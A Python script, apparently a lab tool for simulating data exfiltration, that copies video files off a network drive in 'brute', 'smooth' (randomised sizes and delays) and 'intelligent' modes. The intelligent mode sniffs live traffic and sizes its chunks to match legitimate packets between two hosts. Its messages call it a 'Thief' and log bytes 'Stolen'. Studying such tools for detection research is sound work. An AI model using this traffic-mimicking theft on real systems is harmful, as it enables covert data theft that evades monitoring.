import argparse
import random
import time
import glob
import sys
import pyshark
from netaddr import IPNetwork, IPAddress, IPSet

def transferBrute(source, destination, pieceSize=1024):
	with open(source, "rb") as in_file, open(destination, "wb") as out_file:
		while True:
			piece = in_file.read(pieceSize)
			if len(piece) == 0:
				break # end of file
			out_file.write(piece)


def transferSmooth(source, destination):
	sizeTranfered = 0
	with open(source, "rb") as in_file, open(destination, "wb") as out_file:
		while True:
			print("Stolen:"+str(sizeTranfered))
			time.sleep(random.randint(0, 5))
			pieceSize = random.randint(102400, 409600)
			sizeTranfered += pieceSize
			piece = in_file.read(pieceSize)
			if len(piece) == 0:
				break # end of file
			out_file.write(piece)


def pkt_callback(pkt):
	global scnets
	global ssnets
	global npkts
	global c
	global T0
	global lastks
	global sampDelta
	global obsDelta
	global in_file
	global out_file	
	global sizeTranfered
	global previousPkt

	if (IPAddress(pkt.ip.src) in scnets and IPAddress(pkt.ip.dst) in ssnets) or (IPAddress(pkt.ip.src) in ssnets and IPAddress(pkt.ip.dst) in scnets):
		t=float(pkt.sniff_timestamp)
		if npkts==0:
			T0=t
			lastks=0
			c=[0,0,0,0]
		
		print("Stolen:"+str(sizeTranfered))
		pieceSize = int(pkt.ip.len)-previousPkt
		previousPkt = int(pkt.ip.len)
		if pieceSize > 0:
			sizeTranfered += pieceSize
			piece = in_file.read(pieceSize)
			if len(piece) == 0:
				capture.close()
			out_file.write(piece)
		

def transferIntelligent(source, destination):
	#Wi-Fi  
	cnets=[]
	for n in ["192.168.1.109"]:
		try:
			nn=IPNetwork(n)
			cnets.append(nn)
		except:
			print('{} is not a network prefix'.format(n))
	global scnets
	scnets=IPSet(cnets)

	snets=[]
	for n in ["192.168.1.253"]:
		try:
			nn=IPNetwork(n)
			snets.append(nn)
		except:
			print('{} is not a network prefix'.format(n))
	global ssnets
	ssnets=IPSet(snets)
		
	global npkts
	global T0
	global sampDelta
	global obsDelta
	global previousPkt
	global sizeTranfered
	global in_file
	global out_file
	global capture
	npkts=0
	T0={}
	sampDelta=1
	obsDelta=30
	previousPkt=0
	sizeTranfered=0
	sizeTranfered = 0
	capture = pyshark.LiveCapture(interface="Wi-Fi",bpf_filter='ip')
	with open(source, "rb") as in_file, open(destination, "wb") as out_file:
		capture.apply_on_packets(pkt_callback)
	

def main():
	parser=argparse.ArgumentParser()
	parser.add_argument('-b', '--brute-dump', action='store_true', help='Thief in brute dump mode.')
	parser.add_argument('-s', '--smooth-dump', action='store_true', help='Thief in smooth dump mode.')
	parser.add_argument('-i', '--intelligent-dump', action='store_true', help='Thief in intelligent dump mode.')
	args=parser.parse_args()

	if not args.brute_dump and not args.smooth_dump and not args.intelligent_dump:
		print("No mode selected!")
		sys.exit(0)

	files=glob.glob("Z:\\videos\\*.mp4")
	for file in files:
		name = file.split("\\")[-1]
		print(name)
	
		if args.brute_dump:
			print("Brute dump mode!")
			transferBrute(source=file, destination=name, pieceSize=1024)
		elif args.smooth_dump:
			print("Smooth dump mode!")
			transferSmooth(source=file, destination=name)
		elif args.intelligent_dump:
			print("Intelligent dump mode!")
			try:
				transferIntelligent(source=file, destination=name)
			except KeyboardInterrupt:
				break


if __name__ == '__main__':
	main()
